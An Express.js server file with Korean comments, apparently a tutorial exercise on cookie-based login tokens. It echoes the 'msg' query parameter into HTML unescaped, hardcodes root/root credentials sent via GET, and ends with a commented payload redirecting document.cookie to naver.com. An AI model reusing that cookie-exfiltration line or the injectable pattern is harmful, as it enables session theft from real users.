const express = require('express');
const cookieParser = require('cookie-parser');
let token = require('./createtoken'); //외부 js파일 가져오기
const app = express();

app.use(cookieParser());

app.get('/',(req,res)=>{
    //key:value
    //set-cookie : 'token=ingoo' 응답 header
    let {msg} = req.query;
    res.send(`${msg}hellow world! <a href="/menu1">menu1</a><a href="/login?id=root&pw=root">로그인</a>`); //body : { hellow world! }
})

app.get('/menu1',(req,res)=>{
    console.log(req.cookies);
    res.send('menu1 페이지 입니다')
})
app.get('/login',(req,res)=>{
    let {id,pw}= req.query; //비구조 할당문 사용시 let,const 변수선언문이 꼭 필요
                            //혹시 사용할 일이 없으면 () 안으로 사용
    if(id=='root'&&pw=='root'){
        //토큰생성
        let  ctoken = token();
        res.cookie('token',ctoken,{httpOnly:true,secure:true,});
        res.redirect('/?msg=로그인성공');
    }else{
        //토큰 실패
        res.redirect('/?msg=로그인 실패');
    }

})
app.listen(3500,()=>{
    console.log('server start port:3500');
})
//location.href=`http//naver.com?${document.cookie}`